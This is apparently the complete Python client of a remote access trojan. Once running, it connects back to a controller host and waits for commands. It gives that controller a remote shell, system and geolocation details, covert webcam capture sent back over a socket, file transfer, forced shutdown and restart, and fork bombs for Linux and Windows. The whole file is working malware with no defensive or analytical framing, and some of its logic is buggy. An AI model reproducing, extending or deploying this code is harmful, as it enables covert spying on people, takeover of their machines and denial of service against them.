#import libraries
import socket
import threading
import random
import time
import os
import sys
import platform
import requests
import json
import webbrowser
import cv2
import asymcrypt
import cryptography
from cryptography.fernet import Fernet


#server variables
HOST = ""
PORT = 6168
encryption_key = b""

def random_string(length):
    string = ""
    for x in range(0,length):
        string = string + random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-")
    return(string)
def get(size):
    cipher = Fernet(encryption_key)
    packet = cipher.decrypt(conn.recv(size)).decode()
    return packet
def put(data):
    cipher = Fernet(encryption_key)
    conn.sendall(cipher.encrypt(str(data).encode()))
def get_ip(what):
    response = requests.get('https://ipinfo.io/json', verify = True)

    if response.status_code != 200:
        return 'Status:', response.status_code, 'Problem with the request. Exiting.'

    data = response.json()

    return data[what]
def rshell():
    while True:
        command = get(1024)
        if command != "exit":
            output = ""
            try:
                output = os.popen(command)
            except Exception as e:
                pass
            output = output.read()
            if output != "":
                put(output)
            else:
                put("command complete!")
        else:
            break
def pc_info():
    put(platform.system())
    wait(0.1)
    put(platform.machine())
def pc_location():
    items = ["ip","city","region","country","org","timezone"]
    for x in items:
        put(get_ip(x))
        wait(0.1)
def open_website():
    link = get(1024)
    webbrowser.open(link)
def take_photo():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if not ret:
        put("error")
    else:
        put("succes")
        img_name = "image.png"
        cv2.imwrite(img_name, frame)
        cam.release()
        putfile(img_name)
        os.remove(img_name)
def putfile(file_name):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as nconn:
        nconn.connect((HOST, 7127))
        wait(1)
        with open(file_name, "rb") as f:
            while chunk := f.read(512 * 10):
                nconn.sendall(chunk)
def getfile(file_name):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as nconn:
        wait(0.5)
        nconn.connect((HOST, 7127))

        wait(1)
        f = open(file_name,"wb")
        while True:
            chunk = nconn.recv(1024)
            if not chunk:
                break
            f.write(chunk)
        f.close()
    decryptfile(file_name, encryption_key)
def getHOST():
    global HOST
    #url = "https://pastebin.com/raw/83bhrUfw"
    #HOST = requests.get(url)
    #HOST = HOST.text
    HOST = "127.0.0.1"
def shutdown():
    if platform == "linux" or "darwin":
        tmp = os.popen("shutdown")
    if platform == "win32":
        tmp = os.popen("shutdown /s")
    pass
def restart():
    if platform == "linux" or "darwin":
        tmp = os.popen("reboot")
    if platform == "win32":
        tmp = os.popen("shutdown /r")
def decryptfile(path,key):
    cipher = Fernet(key)

    with open(path, 'rb') as file:
        original = file.read()
    encrypted = cipher.encrypt(original)

    with open('result.png', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
def encryptfile(path,key):
    cipher = Fernet(key)

    with open(path, 'rb') as file:
        original = file.read()
    encrypted = cipher.encrypt(original)

    with open(path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
def getCryptKey():
    key = Fernet.generate_key()
    return(key)
def wait(x):
    time.sleep(x)
def quit():
    conn.close()
def forkbomb():
    if platform == "linux" or "darwin":
        tmp = os.popen("x(){ x|x& };x")
    if platform == "win32":
        tmp = os.popen("for /l %a in (0,0,0) do start")
    pass


while True:
    while True:
        getHOST()
        conn =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            wait(5)
            conn.connect((HOST, PORT))

            v = random_string(6)
            asymcrypt.generate_keys(f'{v}pr.pem',f'{v}pu.pem')
            f = open(f"{v}pu.pem","rb")
            key = f.read()
            conn.sendall(key)
            f.close()
            x = conn.recv(2048)
            encryption_key = asymcrypt.decrypt_data(x, f"{v}pr.pem")
            os.remove(f"{v}pu.pem")
            os.remove(f"{v}pr.pem")

            while True:
                command = get(1024)
                if command == "shell":
                    rshell()
                if command == "pc_info":
                    pc_info()
                if command == "pc_location":
                    pc_location()
                if command == "open_website":
                    open_website()
                if command == "take_photo":
                    take_photo()
                if command == "shutdown":
                    shutdown()
                if command == "restart":
                    restart()
                if command == "quit":
                    quit()
                    break
                if command == "forkbomb":
                    forkbomb()

        except Exception as e:
            wait(2)
            break
